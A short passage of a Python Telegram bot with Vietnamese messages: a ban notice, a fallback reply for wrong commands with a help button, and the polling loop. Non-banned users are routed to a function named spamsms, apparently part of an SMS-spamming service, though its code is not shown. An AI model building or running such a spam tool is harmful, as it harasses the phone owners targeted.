        bot.send_message(message.chat.id, "🛡️ Bạn đã bị ban. Liên hệ admin để được hỗ trợ !", reply_markup=keyboard)    
    else:
        spamsms(message)                  


# Hàm trả lời ngoại lệ     
@bot.message_handler(func=lambda message: True)
@bot.message_handler(content_types=['sticker','photo','video','document'])    
def answer_exception(message):
    keyboard = InlineKeyboardMarkup()
    button_huongdan = InlineKeyboardButton(text="📜 Hướng dẫn", callback_data = "huong_dan")
    keyboard.row(button_huongdan)
    bot.send_message(message.chat.id, "<b>❌ Sai cú pháp. Xem lệnh dùng bot 👇</b>", parse_mode = 'HTML', reply_markup=keyboard)

if __name__ == "__main__": 
    bot.infinity_polling()
